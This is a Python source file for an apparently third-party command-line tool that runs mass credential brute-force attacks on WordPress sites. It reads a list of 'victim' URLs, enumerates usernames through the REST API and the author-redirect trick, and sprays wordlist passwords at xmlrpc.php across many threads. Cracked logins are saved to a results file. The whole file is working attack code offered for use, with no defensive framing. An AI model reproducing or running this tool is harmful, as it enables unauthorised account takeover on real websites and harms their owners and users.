########################################
# Github : http://github.com/galehrizky#
# Facebook : Galeh Rizky               #
# Email : galehrizky@codelatte.org     #
# visit : c0delabs.com                 #
########################################

import requests,argparse,sys,json,time,re
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

def fetching_user(url):
	print(colored("[{}][*] Fetching user from {}".format(local_time(),url), "blue"))
	user_list = []
	try:
		req = requests.get(url+"/wp-json/wp/v2/users/", headers=headers, timeout=5, verify=False, allow_redirects=False).content.decode('utf-8')
		try:
			print(colored("[{}][!] Success Fetching user from {}".format(local_time(),url), "green"))
			for x in json.loads(req):
				user_list.append(x['slug'])
		except ValueError:
			print(colored("[{}][!] Failed {} to Decoding json !\n".format(local_time(),url), "red"))
			pass

		req = requests.get(url+"/wp-json/wp/v2/users/", headers=headers, timeout=5, verify=False, allow_redirects=False).content.decode('utf-8')
		try:
			print(url)
			response = requests.get(url+"?author=1", headers=headers, timeout=5, verify=False, allow_redirects=True).text
			pattern_string = re.escape('author/') + "(.*?)" + re.escape('/')
			titleRE = re.compile(pattern_string)
			title = titleRE.search(response).group(1)
			user_list.append(title)
		except Exception as e:
			pass
		
	except Exception as e:
		pass

	return user_list

def check_array(arr): 
    if len(arr) == 0: 
        return 0
    else: 
        return 1

def local_time():
	t = time.localtime()
	current_time = time.strftime("%H:%M:%S", t)
	return current_time
def save(format):
	s = open("brute-force-result.txt", "a+")
	s.write(format+"\n")

def exploit(url, user_url, list_password):
	try:
		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)
		headers = {'Content-Type':'text/xml'}
		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15,verify=False)
		if "isAdmin" in str(r.content):
			print(colored("[{}][+] Found username [{}] and password [{}] website {} ".format(local_time(),user_url,list_password,url), "green"))
			save("{}#{}@{}".format(url,user_url,list_password))
		else:
			print(colored("[{}][-] Failed Login {} With username {} password {}".format(local_time(),url,user_url, list_password), "red"))
	except Exception as e:
			pass

def brute_url(url,thread):
	try:
		username_url = fetching_user(url)
		user = []
		if check_array(username_url):
			for username in username_url:
				user.append(username)
		else:
			print(colored('[{}][+] try With default username [admin]'.format(local_time()), "green"))
			user.append("admin")

		password = "wordlist.txt"

		with ThreadPoolExecutor(max_workers=thread) as executor:
			for user_url in user:
				with open(password, "r") as password_list:
					for list_password in password_list:
						executor.submit(exploit,url,user_url,list_password)


			user.clear()
	except Exception as e:
		pass

def main():
 	try:
 		parser = argparse.ArgumentParser(description='Multiple Brute Force XMLRPC [Wordpress]')
 		parser.add_argument("--list", help="List website victim", required=True)
 		parser.add_argument("--thread", help="Add Thread ", required=True)
 		args = parser.parse_args()
 		try:
 			with open(args.list, "r") as victim:
 				print(colored("[+] Start Brute Force on {}".format(local_time()), "yellow"))
 				for sites in victim:
 					url = sites.rstrip()
 					brute_url(url,int(args.thread))
 				print(colored("[+] End Brute Force on {}".format(local_time()), "yellow"))
 		except IOError as e:
 			print("[{}][!] List website victim not exist !".format(local_time()))
 			sys.exit()
 	except KeyboardInterrupt as e:
 		print("[{}][!] Exit Program".format(local_time()))
 		sys.exit()

if __name__ == "__main__":
	banner = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┇    Multiple Brute Force XMLRPC [Wordpress]      ┇
┇        Created by c0delabs Team                 ┇
┇ I don't hope you like all of my Tools Thx       ┇
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
	print(banner)
	main()